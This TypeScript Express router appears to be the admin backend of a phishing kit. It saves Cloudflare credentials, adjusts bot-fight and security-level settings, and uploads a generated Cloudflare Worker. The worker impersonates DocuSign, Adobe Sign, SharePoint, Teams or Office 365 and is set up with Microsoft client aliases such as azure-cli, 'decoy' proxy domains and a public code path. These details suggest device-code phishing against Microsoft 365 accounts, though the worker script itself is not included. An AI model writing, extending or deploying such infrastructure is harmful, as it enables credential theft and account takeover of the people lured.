import { Router } from "express";
import { db } from "@workspace/db";
import { appConfigTable } from "@workspace/db/schema";
import { eq } from "drizzle-orm";
import { generateWorkerScript } from "../lib/workerGenerator";
import { adminAuth } from "../middleware/adminAuth";
import { logger } from "../lib/logger";

const router = Router();

const VALID_CLIENT_ALIASES = [
  "azure-cli",
  "azure-powershell",
  "msgraph",
  "office365",
  "exchange",
  "sharepoint",
  "msteams",
] as const;

const VALID_TEMPLATES = [
  "devdoc-sign",
  "adobe-sign",
  "docusign",
  "sharepoint",
  "onedrive",
  "teams",
  "office365",
] as const;

const VALID_SECURITY_LEVELS = [
  "essentially_off",
  "low",
  "medium",
  "high",
  "under_attack",
] as const;

async function getConfig(key: string): Promise<string | null> {
  const [row] = await db
    .select()
    .from(appConfigTable)
    .where(eq(appConfigTable.key, key))
    .limit(1);
  return row?.value ?? null;
}

async function setConfig(key: string, value: string): Promise<void> {
  await db
    .insert(appConfigTable)
    .values({ key, value })
    .onConflictDoUpdate({ target: appConfigTable.key, set: { value } });
}

async function deleteConfig(key: string): Promise<void> {
  await db.delete(appConfigTable).where(eq(appConfigTable.key, key));
}

const CLOUDFLARE_REQUEST_TIMEOUT_MS = 45_000;

function normalizeCloudflareToken(value: string): string {
  return value.trim().replace(/^Bearer\s+/i, "").trim();
}

function cloudflareRequestError(operation: string, error: unknown): Error {
  if (error instanceof Error && error.name === "AbortError") {
    return new Error(
      `Cloudflare ${operation} timed out after ${CLOUDFLARE_REQUEST_TIMEOUT_MS / 1000} seconds.`,
    );
  }

  const message =
    error instanceof Error && error.message
      ? error.message
      : "The request failed before Cloudflare returned a response.";
  return new Error(`Cloudflare ${operation} request failed: ${message}`);
}

async function fetchCloudflare(
  url: string,
  init: RequestInit,
  operation: string,
): Promise<Response> {
  const controller = new AbortController();
  const timeout = setTimeout(
    () => controller.abort(),
    CLOUDFLARE_REQUEST_TIMEOUT_MS,
  );

  try {
    return await fetch(url, { ...init, signal: controller.signal });
  } catch (error) {
    throw cloudflareRequestError(operation, error);
  } finally {
    clearTimeout(timeout);
  }
}

// ── Shared helper: call a Cloudflare Zone Settings endpoint ──────────────────

async function cfZoneSetting(
  method: "GET" | "PUT",
  apiKey: string,
  zoneId: string,
  setting: string,
  value?: unknown,
): Promise<{ ok: boolean; value?: string; error?: string; status?: number }> {
  const url = `https://api.cloudflare.com/client/v4/zones/${zoneId}/settings/${setting}`;
  const normalizedApiKey = normalizeCloudflareToken(apiKey);
  let res: Response;
  try {
    res = await fetchCloudflare(
      url,
      {
        method,
        headers: {
          Accept: "application/json",
          Authorization: `Bearer ${normalizedApiKey}`,
          ...(method === "PUT" ? { "Content-Type": "application/json" } : {}),
        },
        ...(method === "PUT" ? { body: JSON.stringify({ value }) } : {}),
      },
      `zone settings ${setting}`,
    );
  } catch (error) {
    return {
      ok: false,
      error:
        error instanceof Error
          ? error.message
          : "Cloudflare zone settings request failed.",
    };
  }

  const j = (await res.json().catch(() => ({}))) as {
    success?: boolean;
    result?: { value?: string };
    errors?: { message: string }[];
  };

  if (!res.ok || !j.success) {
    return {
      ok: false,
      status: res.status,
      error: j.errors?.[0]?.message ?? `Cloudflare error ${res.status}`,
    };
  }

  return { ok: true, status: res.status, value: j.result?.value };
}

// ── Save / verify Cloudflare credentials ─────────────────────────────────────

router.post("/deploy/cloudflare-config", adminAuth, async (req, res) => {
  const {
    apiKey,
    accountId,
    apiServerUrl,
    frontendUrl,
    kvNamespaceId,
  } = req.body as {
    apiKey?: string;
    accountId?: string;
    apiServerUrl?: string;
    frontendUrl?: string;
    kvNamespaceId?: string;
  };

  if (
    !apiKey?.trim() ||
    !accountId?.trim() ||
    !apiServerUrl?.trim() ||
    !frontendUrl?.trim()
  ) {
    res.status(400).json({
      error: "apiKey, accountId, apiServerUrl, and frontendUrl are required.",
    });
    return;
  }

  const normalizedApiKey = normalizeCloudflareToken(apiKey);
  if (!normalizedApiKey) {
    res.status(400).json({ error: "A Cloudflare API token is required." });
    return;
  }

  try {
    // Verify the token against the configured Cloudflare account.
    const cfRes = await fetch(
      `https://api.cloudflare.com/client/v4/accounts/${accountId.trim()}`,
      {
        method: "GET",
        headers: {
          Authorization: `Bearer ${normalizedApiKey}`,
          Accept: "application/json",
        },
      },
    ).catch((error: unknown) => {
      throw cloudflareRequestError("token verification", error);
    });

    const verification = (await cfRes.json().catch(() => ({}))) as {
      success?: boolean;
      result?: { id?: string; status?: string };
      errors?: { message?: string }[];
    };

    if (!cfRes.ok || verification.success !== true) {
      const msg =
        verification.errors?.find((error) => error.message)?.message ??
        `Cloudflare returned ${cfRes.status}`;
      res
        .status(400)
        .json({ error: `Cloudflare verification failed: ${msg}` });
      return;
    }

    await Promise.all([
      setConfig("cloudflare_api_key", normalizedApiKey),
      setConfig("cloudflare_account_id", accountId.trim()),
      setConfig("cloudflare_api_server_url", apiServerUrl.trim()),
      setConfig("cloudflare_frontend_url", frontendUrl.trim()),
      setConfig("cloudflare_kv_namespace_id", kvNamespaceId?.trim() ?? ""),
    ]);

    res.json({ ok: true });
  } catch (error) {
    logger.error({ err: error }, "Failed to save Cloudflare configuration");
    const isCloudflareFailure = error instanceof Error && error.message.startsWith("Cloudflare ");
    res.status(isCloudflareFailure ? 502 : 500).json({
      error: isCloudflareFailure
        ? "Cloudflare verification is currently unavailable. Try again shortly."
        : "Failed to save configuration.",
    });
  }
});

// ── Save Cloudflare Zone ID separately ────────────────────────────────────────

router.post("/deploy/cloudflare-zone", adminAuth, async (req, res) => {
  const { zoneId } = req.body as { zoneId?: string };

  if (!zoneId?.trim()) {
    res.status(400).json({ error: "zoneId is required." });
    return;
  }

  try {
    await setConfig("cloudflare_zone_id", zoneId.trim());
    res.json({ ok: true, zoneId: zoneId.trim() });
  } catch {
    res.status(500).json({ error: "Failed to save Zone ID." });
  }
});

// ── Read current Cloudflare credentials ──────────────────────────────────────

router.get("/deploy/cloudflare-config", adminAuth, async (_req, res) => {
  try {
    const [accountId, zoneId, apiServerUrl, frontendUrl, kvNamespaceId] =
      await Promise.all([
        getConfig("cloudflare_account_id"),
        getConfig("cloudflare_zone_id"),
        getConfig("cloudflare_api_server_url"),
        getConfig("cloudflare_frontend_url"),
        getConfig("cloudflare_kv_namespace_id"),
      ]);
    res.json({
      hasApiKey: !!(await getConfig("cloudflare_api_key")),
      accountId: accountId ?? "",
      zoneId: zoneId ?? "",
      apiServerUrl: apiServerUrl ?? "",
      frontendUrl: frontendUrl ?? "",
      kvNamespaceId: kvNamespaceId ?? "",
    });
  } catch {
    res.status(500).json({ error: "Failed to read configuration." });
  }
});

// ── Delete Cloudflare credentials ─────────────────────────────────────────────

router.delete("/deploy/cloudflare-config", adminAuth, async (_req, res) => {
  try {
    await Promise.all([
      deleteConfig("cloudflare_api_key"),
      deleteConfig("cloudflare_account_id"),
      deleteConfig("cloudflare_api_server_url"),
      deleteConfig("cloudflare_frontend_url"),
      deleteConfig("cloudflare_kv_namespace_id"),
    ]);
    res.json({ ok: true });
  } catch {
    res.status(500).json({ error: "Failed to delete configuration." });
  }
});

// ── Read live Cloudflare zone security settings ───────────────────────────────
// Returns the current bot_fight_mode and security_level values straight from
// the Cloudflare API. Requires a Zone ID and a token with Zone.Settings:Read.

router.get("/deploy/cloudflare-security", adminAuth, async (_req, res) => {
  let apiKey: string | null;
  let zoneId: string | null;

  try {
    [apiKey, zoneId] = await Promise.all([
      getConfig("cloudflare_api_key"),
      getConfig("cloudflare_zone_id"),
    ]);
  } catch {
    res.status(500).json({ error: "Could not read configuration." });
    return;
  }

  if (!apiKey || !zoneId) {
    // No zone ID saved yet — return empty state so UI can show "not configured"
    res.json({ available: false, botFightMode: null, securityLevel: null });
    return;
  }

  try {
    const [botResult, secResult] = await Promise.all([
      cfZoneSetting("GET", apiKey, zoneId, "bot_fight_mode"),
      cfZoneSetting("GET", apiKey, zoneId, "security_level"),
    ]);

    res.json({
      available: botResult.ok || secResult.ok,
      botFightMode: botResult.ok ? botResult.value : null,
      securityLevel: secResult.ok ? secResult.value : null,
      botFightError: botResult.ok ? undefined : botResult.error,
      secLevelError: secResult.ok ? undefined : secResult.error,
    });
  } catch {
    res
      .status(500)
      .json({ error: "Failed to fetch security settings from Cloudflare." });
  }
});

// ── Toggle Bot Fight Mode ─────────────────────────────────────────────────────
// Calls PUT /zones/{zone_id}/settings/bot_fight_mode on the Cloudflare API.
// Requires a token with Zone.Settings:Edit permission.

router.post("/deploy/bot-fight-mode", adminAuth, async (req, res) => {
  const { enabled } = req.body as { enabled?: boolean };

  if (typeof enabled !== "boolean") {
    res.status(400).json({ error: "enabled (boolean) is required." });
    return;
  }

  let apiKey: string | null;
  let zoneId: string | null;

  try {
    [apiKey, zoneId] = await Promise.all([
      getConfig("cloudflare_api_key"),
      getConfig("cloudflare_zone_id"),
    ]);
  } catch {
    res.status(500).json({ error: "Could not read configuration." });
    return;
  }

  if (!apiKey) {
    res.status(400).json({ error: "Cloudflare API key not configured." });
    return;
  }
  if (!zoneId) {
    res.status(400).json({
      error:
        "Zone ID not configured. Add it to the Cloudflare Connection section.",
    });
    return;
  }

  const result = await cfZoneSetting(
    "PUT",
    apiKey,
    zoneId,
    "bot_fight_mode",
    enabled ? "on" : "off",
  );

  if (!result.ok) {
    res.status(502).json({ error: result.error });
    return;
  }

  res.json({ ok: true, value: result.value });
});

// ── Set Security Level ────────────────────────────────────────────────────────
// Calls PUT /zones/{zone_id}/settings/security_level on the Cloudflare API.
// Valid values: essentially_off | low | medium | high | under_attack

router.post("/deploy/security-level", adminAuth, async (req, res) => {
  const { level } = req.body as { level?: string };

  if (
    !level ||
    !VALID_SECURITY_LEVELS.includes(
      level as (typeof VALID_SECURITY_LEVELS)[number],
    )
  ) {
    res.status(400).json({
      error: `Invalid level. Valid values: ${VALID_SECURITY_LEVELS.join(", ")}`,
    });
    return;
  }

  let apiKey: string | null;
  let zoneId: string | null;

  try {
    [apiKey, zoneId] = await Promise.all([
      getConfig("cloudflare_api_key"),
      getConfig("cloudflare_zone_id"),
    ]);
  } catch {
    res.status(500).json({ error: "Could not read configuration." });
    return;
  }

  if (!apiKey) {
    res.status(400).json({ error: "Cloudflare API key not configured." });
    return;
  }
  if (!zoneId) {
    res.status(400).json({
      error:
        "Zone ID not configured. Add it to the Cloudflare Connection section.",
    });
    return;
  }

  const result = await cfZoneSetting(
    "PUT",
    apiKey,
    zoneId,
    "security_level",
    level,
  );

  if (!result.ok) {
    res.status(502).json({ error: result.error });
    return;
  }

  res.json({ ok: true, value: result.value });
});

// ── Deploy worker ─────────────────────────────────────────────────────────────

router.post("/deploy", adminAuth, async (req, res) => {
  const {
    template,
    region,
    clientAlias,
    publicCodePath,
    decoyDomains,
    kvBindingName,
  } = req.body as {
    template?: string;
    region?: string;
    clientAlias?: string;
    publicCodePath?: string;
    decoyDomains?: string[];
    kvBindingName?: string;
  };

  if (!template || !clientAlias) {
    res.status(400).json({ error: "template and clientAlias are required." });
    return;
  }

  if (!publicCodePath?.trim() || !publicCodePath.startsWith("/")) {
    res
      .status(400)
      .json({ error: "publicCodePath is required and must start with /." });
    return;
  }

  const filteredDecoys = (decoyDomains ?? []).filter(Boolean);
  if (filteredDecoys.length === 0) {
    res
      .status(400)
      .json({ error: "At least one proxy website URL is required." });
    return;
  }

  if (
    !VALID_CLIENT_ALIASES.includes(
      clientAlias as (typeof VALID_CLIENT_ALIASES)[number],
    )
  ) {
    res.status(400).json({
      error: `Invalid clientAlias "${clientAlias}". Valid values: ${VALID_CLIENT_ALIASES.join(", ")}.`,
    });
    return;
  }

  if (!VALID_TEMPLATES.includes(template as (typeof VALID_TEMPLATES)[number])) {
    res.status(400).json({
      error: `Invalid template "${template}". Valid values: ${VALID_TEMPLATES.join(", ")}.`,
    });
    return;
  }

  let cfKey: string | null;
  let accountId: string | null;
  let apiServerUrl: string | null;
  let frontendUrl: string | null;
  let kvNamespaceId: string | null;

  try {
    [cfKey, accountId, apiServerUrl, frontendUrl, kvNamespaceId] =
      await Promise.all([
        getConfig("cloudflare_api_key"),
        getConfig("cloudflare_account_id"),
        getConfig("cloudflare_api_server_url"),
        getConfig("cloudflare_frontend_url"),
        getConfig("cloudflare_kv_namespace_id"),
      ]);
  } catch {
    res.status(500).json({ error: "Could not read configuration from DB." });
    return;
  }

  if (!cfKey) {
    res
      .status(400)
      .json({ error: "Cloudflare API key not configured. Connect first." });
    return;
  }
  const normalizedCfKey = normalizeCloudflareToken(cfKey);
  if (!accountId) {
    res
      .status(400)
      .json({ error: "Cloudflare Account ID not configured. Connect first." });
    return;
  }
  if (!apiServerUrl) {
    res
      .status(400)
      .json({ error: "API Server URL not configured. Connect first." });
    return;
  }
  const workerApiSecret = process.env["WORKER_API_SECRET"];
  if (!workerApiSecret) {
    res.status(503).json({ error: "WORKER_API_SECRET is not configured on the admin server." });
    return;
  }
  if (!frontendUrl) {
    res
      .status(400)
      .json({ error: "Frontend URL not configured. Connect first." });
    return;
  }

  const resolvedKvBinding = kvBindingName?.trim() || "CODE_STORE";

  const workerScript = generateWorkerScript({
    template,
    clientAlias,
    apiServerUrl,
    frontendUrl,
    publicCodePath: publicCodePath.trim(),
    decoyDomains: filteredDecoys,
    kvBindingName: resolvedKvBinding,
    kvNamespaceId: kvNamespaceId?.trim() || undefined,
    workerApiSecret,
  });

  const scriptName = `devdoc-${template}`.replace(/[^a-z0-9-]/g, "-");

  const metadataObj: Record<string, unknown> = {
    main_module: "worker.js",
    compatibility_date: "2024-01-01",
  };

  if (kvNamespaceId?.trim()) {
    metadataObj.bindings = [
      {
        type: "kv_namespace",
        name: resolvedKvBinding,
        namespace_id: kvNamespaceId.trim(),
      },
    ];
  }

  // Keep the upload format identical to the known-working implementation:
  // Cloudflare Workers accepts this multipart body with an explicit boundary.
  const boundary = `----FormBoundary${Date.now()}`;
  const CRLF = "\r\n";
  const body =
    `--${boundary}${CRLF}` +
    `Content-Disposition: form-data; name="metadata"${CRLF}` +
    `Content-Type: application/json${CRLF}${CRLF}` +
    `${JSON.stringify(metadataObj)}${CRLF}` +
    `--${boundary}${CRLF}` +
    `Content-Disposition: form-data; name="worker.js"; filename="worker.js"${CRLF}` +
    `Content-Type: application/javascript+module${CRLF}${CRLF}` +
    `${workerScript}${CRLF}` +
    `--${boundary}--`;

  let cfResponse: Response;
  try {
    cfResponse = await fetch(
      `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/scripts/${scriptName}`,
      {
        method: "PUT",
        headers: {
          Authorization: `Bearer ${normalizedCfKey}`,
          "Content-Type": `multipart/form-data; boundary=${boundary}`,
        },
        body,
      },
    ).catch((error: unknown) => {
      throw cloudflareRequestError("Worker upload", error);
    });
  } catch (error) {
    res.status(502).json({
      error:
        error instanceof Error
          ? error.message
          : "Cloudflare Worker upload failed before a response arrived.",
    });
    return;
  }

  const cfJson = (await cfResponse.json().catch(() => ({}))) as {
    success?: boolean;
    errors?: { message: string }[];
    result?: { id?: string };
  };

  if (!cfResponse.ok || !cfJson.success) {
    const msg =
      cfJson.errors?.[0]?.message ?? `Cloudflare error ${cfResponse.status}`;
    res.status(502).json({ error: msg });
    return;
  }

  // Enable workers.dev subdomain route for the script
  try {
    const subdomainEnableResponse = await fetchCloudflare(
      `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/scripts/${scriptName}/subdomain`,
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${normalizedCfKey}`,
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ enabled: true }),
      },
      "Workers subdomain setup",
    );

    if (!subdomainEnableResponse.ok) {
      const subdomainJson = (await subdomainEnableResponse
        .json()
        .catch(() => ({}))) as {
        errors?: { message?: string }[];
      };
      const message =
        subdomainJson.errors?.find((error) => error.message)?.message ??
        `Cloudflare returned ${subdomainEnableResponse.status}.`;
      res.status(502).json({
        error: `Worker uploaded, but the workers.dev subdomain could not be enabled: ${message}`,
      });
      return;
    }
  } catch (error) {
    res.status(502).json({
      error:
        error instanceof Error
          ? `Worker uploaded, but ${error.message}`
          : "Worker uploaded, but the workers.dev subdomain setup failed.",
    });
    return;
  }

  // Fetch the account's workers.dev subdomain
  let workerSubdomain = accountId;
  try {
    const subRes = await fetchCloudflare(
      `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/subdomain`,
      {
        headers: {
          Accept: "application/json",
          Authorization: `Bearer ${normalizedCfKey}`,
        },
      },
      "Workers subdomain lookup",
    );
    if (subRes.ok) {
      const subJson = (await subRes.json()) as {
        result?: { subdomain?: string };
        success?: boolean;
      };
      if (subJson.success && subJson.result?.subdomain) {
        workerSubdomain = subJson.result.subdomain;
      }
    }
  } catch {
    // fall back to accountId
  }

  const workerUrl = `https://${scriptName}.${workerSubdomain}.workers.dev`;
  const accessUrl = workerUrl + publicCodePath.trim();

  await Promise.all([
    setConfig("last_deployed_template", template),
    setConfig("last_deployed_client_alias", clientAlias),
    setConfig("last_deployed_region", region ?? "auto"),
    setConfig("last_deployed_worker_url", workerUrl),
    setConfig("last_deployed_script_name", scriptName),
    setConfig("last_deployed_public_code_path", publicCodePath.trim()),
    setConfig("last_deployed_decoy_domains", JSON.stringify(filteredDecoys)),
    setConfig("last_deployed_kv_binding_name", resolvedKvBinding),
  ]);

  res.json({ ok: true, url: workerUrl, accessUrl, scriptName });
});

// ── Get last deployment info ──────────────────────────────────────────────────

router.get("/deploy/last", adminAuth, async (_req, res) => {
  try {
    const [
      template,
      clientAlias,
      region,
      workerUrl,
      scriptName,
      publicCodePath,
      decoyDomainsRaw,
      kvBindingName,
    ] = await Promise.all([
      getConfig("last_deployed_template"),
      getConfig("last_deployed_client_alias"),
      getConfig("last_deployed_region"),
      getConfig("last_deployed_worker_url"),
      getConfig("last_deployed_script_name"),
      getConfig("last_deployed_public_code_path"),
      getConfig("last_deployed_decoy_domains"),
      getConfig("last_deployed_kv_binding_name"),
    ]);
    res.json({
      template: template ?? "devdoc-sign",
      clientAlias: clientAlias ?? "azure-cli",
      region: region ?? "auto",
      workerUrl: workerUrl ?? "",
      accessUrl:
        workerUrl && publicCodePath
          ? workerUrl + publicCodePath
          : workerUrl ?? "",
      scriptName: scriptName ?? "",
      publicCodePath: publicCodePath ?? "",
      decoyDomains: decoyDomainsRaw ? JSON.parse(decoyDomainsRaw) : [],
      kvBindingName: kvBindingName ?? "",
    });
  } catch {
    res.status(500).json({ error: "Failed to read last deployment." });
  }
});

// ── Delete deployed worker from Cloudflare ────────────────────────────────────

router.delete("/deploy/worker", adminAuth, async (_req, res) => {
  let cfKey: string | null;
  let accountId: string | null;
  let scriptName: string | null;

  try {
    [cfKey, accountId, scriptName] = await Promise.all([
      getConfig("cloudflare_api_key"),
      getConfig("cloudflare_account_id"),
      getConfig("last_deployed_script_name"),
    ]);
  } catch {
    res.status(500).json({ error: "Could not read configuration." });
    return;
  }

  if (!cfKey || !accountId) {
    res.status(400).json({ error: "Cloudflare credentials not configured." });
    return;
  }
  if (!scriptName) {
    res.status(400).json({ error: "No deployed worker found." });
    return;
  }

  try {
    const cfRes = await fetchCloudflare(
      `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/scripts/${scriptName}`,
      {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          Authorization: `Bearer ${normalizeCloudflareToken(cfKey)}`,
        },
      },
      "Worker deletion",
    );

    const cfJson = (await cfRes.json().catch(() => ({}))) as {
      success?: boolean;
      errors?: { message: string }[];
    };

    if (!cfRes.ok || !cfJson.success) {
      const msg =
        cfJson.errors?.[0]?.message ?? `Cloudflare error ${cfRes.status}`;
      res.status(502).json({ error: msg });
      return;
    }

    await Promise.all([
      deleteConfig("last_deployed_worker_url"),
      deleteConfig("last_deployed_script_name"),
    ]);

    res.json({ ok: true });
  } catch (error) {
    res.status(502).json({
      error:
        error instanceof Error
          ? error.message
          : "Cloudflare Worker deletion failed before a response arrived.",
    });
  }
});

export default router;
